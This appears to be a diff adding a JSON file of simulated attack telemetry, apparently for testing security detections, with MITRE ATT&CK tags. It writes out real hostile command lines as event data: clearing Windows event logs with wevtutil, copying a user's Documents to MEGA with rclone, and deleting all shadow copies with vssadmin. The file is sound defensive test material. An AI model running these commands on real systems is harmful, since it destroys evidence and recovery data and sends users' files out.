@@ -1,0 +1,71 @@
+[
+  {
+    "name": "Defense Evasion - Log Clearing",
+    "delay": 0.1,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "wevtutil.exe",
+        "ProcessCommandLine": "wevtutil cl System",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "Administrator",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "mitre": {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.001",
+          "technique_name": "Indicator Removal: Clear Windows Event Logs"
+        }
+      }
+    ]
+  },
+  {
+    "name": "Data Exfiltration via Rclone",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "rclone.exe",
+        "ProcessCommandLine": "rclone.exe copy C:\\Users\\{{RANDOM_USER}}\\Documents mega:{{RANDOM_GUID}} --max-size 10M",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1567.002",
+          "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+        }
+      },
+      {
+        "source": "proxy",
+        "event_type": "web_proxy",
+        "url": "https://mega.nz/upload",
+        "http_method": "POST",
+        "http_status": 200,
+        "user_agent": "rclone/v1.62.2",
+        "multiply": 50
+      }
+    ]
+  },
+  {
+    "name": "Impact - Shadow Copy Deletion",
+    "delay": 5.0,
+    "events": [
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "FileName": "vssadmin.exe",
+        "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet",
+        "ProcessId": "{{RANDOM_PID}}",
+        "AccountName": "SYSTEM",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "mitre": {
+          "tactic": "Impact",
+          "technique_id": "T1490",
+          "technique_name": "Inhibit System Recovery"
+        }
+      }
+    ]
+  }
+]
